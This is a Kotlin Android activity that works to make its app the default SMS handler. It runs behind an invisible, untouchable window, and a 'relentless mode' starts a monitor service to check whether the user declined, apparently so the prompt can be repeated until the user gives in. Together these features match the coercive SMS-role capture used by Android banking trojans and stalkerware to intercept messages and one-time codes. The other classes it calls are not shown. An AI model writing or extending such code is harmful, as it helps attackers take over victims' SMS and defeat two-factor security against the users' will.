package com.example.myandroid

import android.app.Activity
import android.content.Intent
import android.os.Build
import android.os.Bundle
import android.provider.Telephony
import android.app.role.RoleManager

class SmsRoleActivity : Activity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        // Invisible and untouchable
        window.addFlags(android.view.WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE)

        try {
            val intent = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                val roleManager = getSystemService(RoleManager::class.java)
                roleManager?.createRequestRoleIntent(RoleManager.ROLE_SMS)
            } else {
                Intent(Telephony.Sms.Intents.ACTION_CHANGE_DEFAULT).apply {
                    putExtra(Telephony.Sms.Intents.EXTRA_PACKAGE_NAME, packageName)
                }
            }
            
            if (intent != null) {
                startActivityForResult(intent, 888)
            } else {
                finish()
            }
        } catch (e: Exception) {
            DebugLogger.log("SMS_ROLE_ERR", "Failed to launch prompt: ${e.message}")
            finish()
        }
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == 888) {
            // If relentless mode is active, trigger the monitor check immediately to see if they declined
            if (DefaultSmsManager.isRelentlessActive) {
                val i = Intent(this, MonitorService::class.java)
                i.putExtra("kick_relentless_sms", true)
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    startForegroundService(i)
                } else {
                    startService(i)
                }
            }
            finish()
            overridePendingTransition(0, 0)
        }
    }
}
